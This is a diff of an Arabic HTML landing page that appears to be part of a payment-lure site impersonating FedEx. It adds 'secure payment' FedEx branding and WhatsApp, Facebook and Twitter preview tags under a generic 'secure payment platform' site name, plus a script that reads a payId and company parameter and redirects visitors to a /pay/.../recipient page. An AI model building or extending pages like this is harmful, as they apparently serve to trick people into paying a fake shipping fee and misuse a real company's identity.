@@ -1,25 +1,54 @@
 <!doctype html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>فيديكس - FedEx | تتبع شحنتك وأكمل الدفع</title>
-    <meta name="description" content="فيديكس - خدمات شحن دولية موثوقة مع تتبع فوري للشحنات" />
+    <title>دفع آمن - FedEx الشحن الدولي الموثوق 📦</title>
+    <meta name="description" content="FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰" />
+    
+    <!-- Open Graph / Facebook / WhatsApp -->
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="منصة الدفع الآمن" />
+    <meta property="og:locale" content="ar_AR" />
+    <meta property="og:title" content="دفع آمن - FedEx الشحن الدولي الموثوق 📦" />
+    <meta property="og:description" content="FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰" />
+    <meta property="og:image" content="/og-fedex.jpg" />
+    <meta property="og:image:secure_url" content="/og-fedex.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:image:alt" content="دفع آمن - FedEx الشحن الدولي الموثوق 📦" />
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="دفع آمن - FedEx الشحن الدولي الموثوق 📦" />
+    <meta name="twitter:description" content="FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰" />
+    <meta name="twitter:image" content="/og-fedex.jpg" />
+    <meta name="twitter:image:alt" content="دفع آمن - FedEx الشحن الدولي الموثوق 📦" />
+    
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
-    <meta property="og:title" content="فيديكس - FedEx | تتبع شحنتك وأكمل الدفع" />
-    <meta property="og:description" content="فيديكس - خدمات شحن دولية موثوقة مع تتبع فوري للشحنات" />
-    <meta property="og:image" content="/og-fedex.jpg" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="/og-fedex.jpg" />
 </head>
 <body>
-    <div id="root" style="text-align: center; padding: 100px 20px; font-family: 'Almarai', sans-serif;">
-        <h1>فيديكس - FedEx</h1>
-        <p>جاري التحميل...</p>
+    <div id="root" style="display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Almarai', sans-serif;">
+        <div style="text-align: center;">
+            <h2>جاري التحويل...</h2>
+            <p>يرجى الانتظار</p>
+        </div>
     </div>
-    <script>window.location.href = window.location.origin + window.location.pathname.replace('/r/', '/r/');</script>
+    <script>
+        const service = 'fedex';
+        const urlParams = new URLSearchParams(window.location.search);
+        const payId = urlParams.get('payId') || urlParams.get('id');
+        const company = urlParams.get('company') || service;
+        
+        if (payId) {
+            window.location.href = `/pay/${payId}/recipient?service=${company}`;
+        } else {
+            window.location.href = '/';
+        }
+    </script>
     <script type="module" src="/src/main.tsx"></script>
 </body>
 </html>
